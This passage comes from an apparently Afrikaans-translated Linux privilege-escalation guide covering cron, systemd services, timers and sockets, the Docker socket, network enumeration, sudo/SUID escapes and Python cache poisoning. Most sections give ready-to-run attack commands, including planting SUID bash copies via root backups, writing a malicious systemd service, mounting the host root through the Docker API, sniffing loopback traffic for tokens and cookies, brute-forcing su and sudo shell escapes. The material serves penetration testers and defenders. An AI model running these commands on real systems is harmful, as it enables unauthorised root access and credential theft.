for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Jy kan ook** [**pspy**](https://github.com/DominicBreuker/pspy/releases) gebruik (dit sal elke proses wat begin monitor en lys).

### Root-rugsteun wat aanvaller-gestelde modus-bisse behou (pg_basebackup)

As ’n root-owned cron `pg_basebackup` (of enige rekursiewe kopieeraksie) uitvoer op ’n databasisgids waarna jy kan skryf, kan jy ’n **SUID/SGID binary** daar plaas wat as **root:root** met dieselfde modus-bisse na die rugsteunuitvoer gekopieer sal word.<sup>[[26]](#references)</sup>

Tipiese ontdekkingsproses (as ’n DB-gebruiker met lae voorregte):
- Gebruik `pspy` om ’n root cron op te spoor wat elke minuut iets soos `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` uitvoer.
- Bevestig dat jy na die bronkluster (bv. `/var/lib/postgresql/14/main`) kan skryf en dat die bestemming (`/opt/backups/current`) ná die taak deur root besit word.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Dit werk omdat `pg_basebackup` die lêermodusbisse behou wanneer dit die cluster kopieer; wanneer dit deur root uitgevoer word, erf die bestemmingslêers **root-eienaarskap + aanvallergekose SUID/SGID**. Enige soortgelyke bevoorregte rugsteun-/kopieerroetine wat toestemmings behou en na 'n uitvoerbare ligging skryf, is kwesbaar.

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep **deur 'n carriage return ná 'n opmerking te plaas** (sonder 'n newline-karakter), en die cron job sal werk. Voorbeeld (let op die carriage return-karakter):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Om hierdie soort stealth-inskrywing op te spoor, ondersoek cron-lêers met nutsgoed wat beheertekens sigbaar maak:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Dienste

### Skryfbare _.service_-lêers

Kyk of jy na enige `.service`-lêer kan skryf. Indien wel, **kan jy dit wysig** sodat dit jou **backdoor uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (dalk moet jy wag totdat die masjien herlaai is).\
Skep byvoorbeeld jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diensbinêre lêers

Hou in gedagte dat as jy **skryftoestemmings het op binêre lêers wat deur dienste uitgevoer word**, jy dit met backdoors kan vervang sodat die backdoors uitgevoer word wanneer die dienste weer uitgevoer word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH sien wat deur **systemd** gebruik word met:

```bash
systemctl show-environment
```

As jy agterkom dat jy in enige vouer in die pad kan **skryf**, kan jy moontlik **voorregte eskaleer**. Jy moet soek na **relatiewe paaie wat in dienskonfigurasielêers gebruik word**, soos:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Skep dan ’n **uitvoerbare lêer** met **dieselfde naam as die binêre lêer se relatiewe pad** in die systemd PATH-lêergids waarop jy skryftoegang het. Wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor uitgevoer word** (ongeprivilegieerde gebruikers kan gewoonlik nie dienste begin of stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Kom meer te wete oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-eenheidlêers waarvan die name eindig op `**.timer**` en wat `**.service**`-lêers of gebeurtenisse beheer. **Timers** kan as alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning vir kalendergebeurtenisse en monotone tydgebeurtenisse het, en asinchroon uitgevoer kan word.

Jy kan al die timers lys met:

```bash
systemctl list-timers --all
```

### Skryfbare timers

As jy ’n timer kan wysig, kan jy dit ’n paar eenhede van systemd.unit laat uitvoer (soos ’n `.service` of ’n `.target`).

```bash
Unit=backdoor.service
```

In die dokumentasie kan jy lees wat die Eenheid is:

> Die eenheid wat geaktiveer word wanneer hierdie timer verstryk. Die argument is ’n eenheidnaam waarvan die agtervoegsel nie ".timer" is nie. Indien dit nie gespesifiseer word nie, is hierdie waarde by verstek ’n diens met dieselfde naam as die timereenheid, maar sonder die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die naam van die eenheid wat geaktiveer word en die naam van die timereenheid identies is, behalwe vir die agtervoegsel.

Om hierdie toestemming te misbruik, moet jy dus:

- ’n systemd-eenheid vind (soos ’n `.service`) wat **’n skryfbare binêre uitvoer**
- ’n systemd-eenheid vind wat **’n relatiewe pad uitvoer**, en skryftoegang tot die **systemd PATH** hê (om jou as daardie uitvoerbare lêer voor te doen)

**Kom meer te wete oor timers met `man systemd.timer`.**

### **Aktivering van Timer**

Om ’n timer te aktiveer, benodig jy root-regte en moet jy die volgende uitvoer:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Let daarop dat die **timer** **geaktiveer** word deur ’n simboliese skakel daarna te skep by `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) maak **proseskommunikasie** op dieselfde of verskillende masjiene binne kliënt-bedienermodelle moontlik. Hulle gebruik standaard Unix-deskriptорlêers vir kommunikasie tussen rekenaars en word met `.socket`-lêers opgestel.<sup>[[14]](#references)</sup>

Sockets kan met `.socket`-lêers opgestel word.

**Kom meer te wete oor sockets met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters opgestel word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar word saam gebruik om **aan te dui waar die socket sal luister** (die pad van die AF_UNIX-socketlêer, die IPv4/6- en/of poortnommer waarna geluister moet word, ens.)
- `Accept`: Neem ’n Booleaanse argument. As dit **true** is, word ’n **service-instansie vir elke inkomende verbinding geskep** en slegs die verbindingssocket word daaraan deurgegee. As dit **false** is, word al die luistersockets self **aan die beginne service unit deurgegee**, en word slegs een service unit vir alle verbindings geskep. Hierdie waarde word geïgnoreer vir datagramsockets en FIFOs, waar ’n enkele service unit onvoorwaardelik alle inkomende verkeer hanteer. **Die verstekwaarde is false**. Om prestasieredes word dit aanbeveel om nuwe daemons slegs so te skryf dat hulle geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls wat onderskeidelik **voor** of **ná** die skepping en binding van die luisterende **sockets**/FIFOs **uitgevoer word**. Die eerste token van die opdragreël moet ’n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat onderskeidelik **voor** of **ná** die sluiting en verwydering van die luisterende **sockets**/FIFOs **uitgevoer word**.
- `Service`: Spesifiseer die naam van die **service** unit **wat geaktiveer moet word** wanneer **verkeer inkom**. Hierdie instelling word slegs vir sockets met Accept=no toegelaat. Die verstekwaarde is die service met dieselfde naam as die socket (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket-lêers

As jy ’n **skryfbare** `.socket`-lêer vind, kan jy iets soos `ExecStartPre=/home/kali/sys/backdoor` aan die begin van die `[Socket]`-afdeling **byvoeg**, en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die masjien herlaai is.**\
_Let daarop dat die stelsel daardie socket-lêerkonfigurasie moet gebruik, anders sal die backdoor nie uitgevoer word nie_

### Socket activation + skryfbare unit-pad (skep ontbrekende service)

Nog ’n ernstige verkeerde opstelling is:

- ’n socket unit met `Accept=no` en `Service=<name>.service`
- die verwysde service unit ontbreek
- ’n aanvaller kan na `/etc/systemd/system` (of ’n ander unit-soekpad) skryf

In daardie geval kan die aanvaller `<name>.service` skep en dan verkeer na die socket stuur, sodat systemd die nuwe service as root laai en uitvoer.

Vinnige verloop:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_nou praat ons van Unix Sockets en nie van die config `.socket`-lêers nie_), dan **kan jy met daardie socket kommunikeer** en dalk ’n kwesbaarheid uitbuit.

### Enumereer Unix Sockets

```bash
netstat -a -p --unix
```

### Rou verbinding

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Uitbuitingsvoorbeeld:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-sokke

Let daarop dat daar dalk **sokke is wat na HTTP-versoeke luister** (_ek praat nie van .socket-lêers nie, maar van lêers wat as unix-sokke optree_). Jy kan dit nagaan met:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

As die socket met ’n HTTP-versoek reageer, kan jy daarmee kommunikeer en moontlik ’n kwesbaarheid uitbuit.

### Skryfbare Docker-socket

Die Docker-socket, wat dikwels by `/var/run/docker.sock` voorkom, is ’n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Skryftoegang tot hierdie socket kan tot voorregte-eskalasie lei. Hier volg ’n uiteensetting van hoe dit gedoen kan word, asook alternatiewe metodes indien die Docker CLI nie beskikbaar is nie.

#### **Voorregte-eskalasie met Docker CLI**

As jy skryftoegang tot die Docker-socket het, kan jy voorregte eskaleer met die volgende opdragte:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Hierdie opdragte laat jou toe om ’n container met rootvlaktoegang tot die gasheer se lêerstelsel te laat loop.

#### **Gebruik die Docker API direk**

Wanneer die Docker CLI nie beskikbaar is nie, kan die Docker-sok steeds met rou HTTP oor die Unix-sok misbruik word. Die betroubaarste proses is:

- skep ’n helper-container wat lank loop en die gasheer se wortelgids bind-mount
- begin dit
- skep ’n `exec`-instansie binne daardie helper
- begin die `exec`-instansie en lees die uitvoer terug deur die API

**Lys Docker-beelde**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Skep en begin 'n helper-container**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Skep ’n exec-instansie**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Begin die exec-instansie en lees die uitvoer**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Hierdie patroon is gewoonlik meer betroubaar as om `attach` handmatig met `socat` of `nc -U` te probeer gebruik. Sodra jy ’n helper met `/:/host` kan skep, kan jy bykomende `exec`-instansies gebruik om lêers soos `/host/root/...` te lees, SSH-sleutels onder `/host/root/.ssh` by te voeg of gasheergidslêers te wysig.

### Ander

Let daarop dat as jy skryftoestemmings op die docker-sokkel het omdat jy **in die groep `docker` is**, daar [**meer maniere is om voorregte te eskaleer**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). As die [**docker-API op ’n poort luister**, kan jy dit ook kompromitteer](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit houers te ontsnap of houerloopomgewings te misbruik om voorregte te eskaleer** by:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy agterkom dat jy die **`ctr`**-opdrag kan gebruik, lees die volgende bladsy, aangesien jy dit moontlik kan misbruik om voorregte te eskaleer:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy agterkom dat jy die **`runc`**-opdrag kan gebruik, lees die volgende bladsy, aangesien jy dit moontlik kan misbruik om voorregte te eskaleer:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is ’n gesofistikeerde **interproseskommunikasiestelsel (IPC)** waarmee toepassings doeltreffend kan kommunikeer en data deel. Dit is ontwerp met die moderne Linux-stelsel in gedagte en bied ’n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.<sup>[[16]](#references)</sup>

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan **verbeterde UNIX-domeinsokette**. Dit help ook om gebeurtenisse of seine uit te saai, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, ’n sein van ’n Bluetooth-daemon oor ’n inkomende oproep kan ’n musiekspeler laat demp en sodoende die gebruikerservaring verbeter. D-Bus ondersteun ook ’n afstandobjekstelsel wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig, en prosesse stroomlyn wat tradisioneel ingewikkeld was.

D-Bus werk volgens ’n **toelaat-/weier-model** wat boodskaptoestemmings (metode-aanroepe, seinversendings, ens.) bestuur op grond van die gesamentlike uitwerking van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik voorregte-eskalasie moontlik maak deur die uitbuiting van hierdie toestemmings.

’n Voorbeeld van so ’n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf. Dit beskryf toestemmings vir die wortelgebruiker om boodskappe na `fi.w1.wpa_supplicant1` te besit, te stuur en daarvan te ontvang.

Beleide sonder ’n gespesifiseerde gebruiker of groep geld universeel, terwyl beleide in die "default"-konteks geld vir alles wat nie deur ander spesifieke beleide gedek word nie.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Leer hier hoe om ’n D-Bus-kommunikasie te enumerate en te exploit:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en uit te vind waar die masjien geleë is.

### Generiese enumerasie

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

As ’n aktiewe `/etc/inetd.conf`-inskrywing GNU Inetutils `telnetd` as root laat loop, gaan die gekonfigureerde binêre weergawe en die plaaslike luisteraar na, selfs wanneer die poort slegs aan loopback gebind is. GNU Inetutils 1.9.3 tot en met 2.7 het ’n [telnet-verifikasie-omseiling](https://seclists.org/oss-sec/2026/q1/89) gehad waar `USER` wat deur die kliënt verskaf is, `login -f` bereik het (CVE-2026-24061). ’n Proses of weergawestring is ’n aanduiding; bevestig die verskaffer se pleisterstatus en die werklike daemon voordat jy dit as blootgestel beskou. Die [Telnet-gids](../../../network-services-pentesting/pentesting-telnet.md) bevat meer besonderhede.

### Vinnige voorlopige ondersoek van uitgaande filtering

As die gasheer opdragte kan uitvoer, maar callbacks misluk, onderskei vinnig tussen DNS-, vervoer-, proxy- en roetefiltering:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop waarmee jy nie kon kommunikeer voordat jy toegang daartoe verkry het nie:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klassifiseer listeners volgens bind-teiken:

- `0.0.0.0` / `[::]`: blootgestel op alle plaaslike koppelvlakke.
- `127.0.0.1` / `::1`: slegs plaaslik (goeie kandidate vir tunneling/forwarding).
- Spesifieke interne IP’s (bv. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): gewoonlik slegs bereikbaar vanaf interne segmente.

### Triage-werkvloei vir slegs-plaaslike dienste

Wanneer jy ’n gasheer kompromitteer, word dienste wat aan `127.0.0.1` gebind is, dikwels vir die eerste keer vanaf jou shell bereikbaar. ’n Vinnige plaaslike werkvloei is:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS as netwerkskandeerder (slegs-netwerkmodus)

Benewens plaaslike PE-kontroles kan linPEAS as ’n gefokusde netwerkskandeerder loop. Dit gebruik beskikbare binaries in `$PATH` (gewoonlik `fping`, `ping`, `nc`, `ncat`) en installeer nie gereedskap nie.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

As jy `-d`, `-p` of `-i` sonder `-t` gebruik, tree linPEAS op as ’n suiwer netwerkskandeerder (en slaan die res van die voorregte-eskalasiekontroles oor).

### Sniffing

Kyk of jy verkeer kan afluister. As jy kan, kan jy dalk aanmeldbewyse bekom.

```
timeout 1 tcpdump
```

Vinnige praktiese kontroles:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) is besonder waardevol in post-exploitation omdat baie dienste wat slegs intern beskikbaar is, tokens/cookies/credentials daar blootstel:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Vang nou vas, ontleed later:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Users

### Generic Enumeration

Kontroleer **wie** jy is, watter **voorregte** jy het, watter **gebruikers** op die stelsels is, wie kan **login** en wie **root privileges** het:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Groot UID

Sommige Linux-weergawes is deur ’n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Misbruik dit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kyk of jy **lid is van ’n groep** wat jou root-voorregte kan gee:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Knipbord

Kyk of daar iets interessants in die knipbord is (indien moontlik)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Wagwoordbeleid

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing **ken, probeer om met elke gebruiker aan te meld** deur die wagwoord te gebruik.

### Su Brute

As jy nie omgee om baie geraas te maak nie en `su`- en `timeout`-binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) probeer ook gebruikers te brute-force wanneer die `-a`-parameter gebruik word.

## Misbruik van skryfbare PATH

### $PATH

As jy vind dat jy **in ’n vouer in $PATH kan skryf**, kan jy dalk voorregte eskaleer deur **’n backdoor in die skryfbare vouer te skep** met die naam van ’n opdrag wat deur ’n ander gebruiker (verkieslik root) uitgevoer gaan word en wat **nie gelaai word vanaf ’n vouer wat vroeër as jou skryfbare vouer in $PATH voorkom nie**.

### SUDO en SUID

Jy kan toegelaat word om ’n opdrag met sudo uit te voer, of die opdrag kan die suid-bis hê. Kontroleer dit met:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf, of selfs ’n opdrag uit te voer**.<sup>[[8]](#references)</sup> Byvoorbeeld:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om sekere opdragte met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In hierdie voorbeeld kan die gebruiker demo vim as root uitvoer; dit is nou eenvoudig om ’n shell te kry deur ’n ssh key by die root-gids te voeg of sh aan te roep.

```
sudo vim -c '!sh'
```

### Ongekwoteerde Bash-vergelyking in ’n sudo-skrip

In Bash is die regterkant van `[[ "$protected" == $candidate ]]` ’n patroon. As ’n sudo-skrip wat as root kan loop, `candidate` invul vanaf ’n lêer wat deur die oproeper beheer word, kan ’n waarde soos `prefix*` met die begin van ’n beskermde string ooreenstem. Verskillende sukses- en foutroetes kan dan ’n voorvoegsel-orakel blootlê. Omring die regterkant met aanhalingstekens (`[[ "$protected" == "$candidate" ]]`) wanneer letterlike gelykheid bedoel word. Gaan die werklike sudo-argumente, die herkoms van die invoer en die waarneembare vertakkingsgedrag na voordat jy ’n ongekwoteerde vergelyking as uitbuitbaar beskou. Die [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) definieer hierdie patroon-gedrag.

### PrusaSlicer-projeklêers onder sudo

’n Onbeperkte sudo-toekenning wat `prusaslicer` of `prusa-slicer` as root kan laat loop, verdien ondersoek as die oproeper die `.3mf`-projek kan kies wat gesny word. ’n Projek kan ’n naverwerkingskrip bevat wat loop wanneer G-code uitgevoer word; tot en met weergawe 2.6.1 kon spesiaal vervaardigde projekte opdragte in PrusaSlicer uitvoer ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Bevestig die effektiewe sudo-reël, die binêre weergawe en verskafferpleisters, die projek se bron en of die betrokke uitvoerroete loop voordat jy besluit of die voorreggrens bereik kan word. ’n Vaste projekargument of ’n effektiewe `NOEXEC`-beleid kan die uitkoms verander. Die blote teenwoordigheid van die snyprogram bewys nie dat daar ’n voorregverhogingsroete is nie.

### SETENV

Hierdie direktief laat die gebruiker toe om **’n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Hierdie voorbeeld, **gebaseer op die HTB-masjien Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om ’n arbitrêre Python-biblioteek te laai terwyl die skrip as root uitgevoer word:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning van skryfbare `__pycache__` / `.pyc` in Python-imports wat deur sudo toegelaat word

As ’n **Python-skrip wat deur sudo toegelaat word** ’n module invoer waarvan die pakketgids ’n **skryfbare `__pycache__`** bevat, kan jy dalk die kaslêer `.pyc` vervang en kode as die bevoorregte gebruiker uitvoer wanneer dit volgende keer ingevoer word.<sup>[[30]](#references)</sup>

- Waarom dit werk:
  - CPython stoor bytecode-kaslêers in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Die interpreter valideer die **header** (magic + tydstempel-/hash-metadata wat aan die bron gekoppel is), en voer dan die gemarshalde kode-objek uit wat ná daardie header gestoor is.
  - As jy die kaslêer kan **skrap en herskep** omdat die gids skryfbaar is, kan ’n root-besitte maar nie-skryfbare `.pyc` steeds vervang word.
- Tipiese pad:
  - `sudo -l` wys ’n Python-skrip of wrapper wat jy as root kan uitvoer.
  - Daardie skrip voer ’n plaaslike module in vanaf `/opt/app/`, `/usr/local/lib/...`, ens.
  - Die ingevoerde module se `__pycache__`-gids is skryfbaar deur jou gebruiker of deur almal.

Vinnige verkenning:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

As jy die bevoorregte script kan inspekteer, identifiseer ingevoerde modules en hul kaspad:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Misbruikwerkvloei:

1. Voer die script wat met sudo toegelaat word een keer uit sodat Python die egte kaslêer skep as dit nog nie bestaan nie.
2. Lees die eerste 16 grepe van die egte `.pyc` en hergebruik dit in die vergiftigde lêer.
3. Stel ’n payload-kodeobjek saam, gebruik `marshal.dumps(...)` daarop, vee die oorspronklike kaslêer uit en skep dit weer met die oorspronklike kopskrif plus jou kwaadwillige bytecode.
4. Voer die script wat met sudo toegelaat word weer uit sodat die import jou payload as root uitvoer.

Belangrike notas:

- Die hergebruik van die oorspronklike kopskrif is noodsaaklik, want Python kontroleer die kasmetadata teen die bronlêer, nie of die bytecode-liggaam werklik met die bron ooreenstem nie.
